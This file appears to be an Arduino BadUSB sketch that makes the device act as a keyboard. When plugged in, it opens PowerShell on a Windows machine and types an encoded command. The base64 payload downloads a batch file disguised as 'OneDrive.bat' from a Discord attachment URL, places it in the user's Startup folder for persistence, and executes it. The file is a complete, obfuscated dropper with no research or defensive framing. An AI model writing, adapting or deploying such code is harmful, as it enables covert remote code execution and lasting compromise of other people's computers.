#include <Keyboard.h>


void shell() {
  Keyboard.print("powershell ");
  Keyboard.write('/');
  Keyboard.print("enc JAB1AHMAIAA9ACAAJABlAG4AdgA6AFUAUwBFAFIATgBBAE0ARQAKACQAYwBvAGQAZQAgAD0AIAAiAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACcAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AOQA3ADUANAA1ADcAOAA5ADUANAA4ADkANgAyADYAMgAwADIALwAxADIAMQAwADkANQAwADMAOQA5ADIANwAyADUANQA4ADYAOQAyAC8ATwBuAGUARAByAGkAdgBlAC4AYgBhAHQAPwBlAHgAPQA2ADUAZQBjADYAYwA3ADEAJgBpAHMAPQA2ADUAZAA5AGYANwA3ADEAJgBoAG0APQBhAGMAOABhAGIAOAA0AGEAZAA4AGEANABlADcAMQAzADUANgBlADEANgBjAGYANABiADcAMAAwADIAYgA5ADcANQA2ADQAOQAwADYANQA5ADgAMwA1AGQAZAAzAGMAYQBkAGEAOQBjAGIAOAA2AGEANQBjADgAOAA3ADEAZAAzACYAJwAgAC0ATwB1AHQARgBpAGwAZQAgAE8AbgBlAEQAcgBpAHYAZQAuAGIAYQB0ACIACgAkAGYAaQBsADEAIAA9ACAAIgBDADoAXABVAHMAZQByAHMAXAAiAAoAJABmAGkAbAAyACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABmAGkAbAAxACAAJAB1AHMAIgBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXAAiAAoASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABjAG8AZABlAAoATQBvAHYAZQAtAEkAdABlAG0AIABPAG4AZQBEAHIAaQB2AGUALgBiAGEAdAAgACQAZgBpAGwAMgAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACIAJABmAGkAbAAyAFwATwBuAGUARAByAGkAdgBlAC4AYgBhAHQAIgAKAA");
  Keyboard.write(')');
  Keyboard.write(')');

  Keyboard.print("<");
  Keyboard.print(" exit");

}

void setup() {
  delay(1000);

  // Keyboard.print("<");

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  
  delay(1000);
  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1500);

  shell();

  delay(500);
  
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {
  
}
